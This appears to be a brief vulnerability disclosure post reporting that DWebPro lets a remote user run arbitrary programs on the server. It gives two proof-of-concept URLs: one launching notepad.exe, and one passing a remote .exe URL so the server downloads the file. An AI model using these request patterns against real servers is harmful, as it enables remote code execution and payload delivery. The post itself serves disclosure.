Subject: DWebPro allow an invader to execute any program at server side

The last version of DWebPro allows an invader to execute any program. Just hit this at your browser:

http://127.0.0.1:8080/dwebpro/start?file=C:\windows\system32\notepad.exe&params=C:\hi.txt

And the notepad.exe will open a txt file that calls hi at C:\ server's side.

If you try this: http://127.0.0.1:8080/dwebpro/start?file=http://www.somesite.com.br/somefile.exe will open a browser at server side and download the file.

It's really dangerous.

I tested this at last version but may work at older versions as well.

Best Regards,
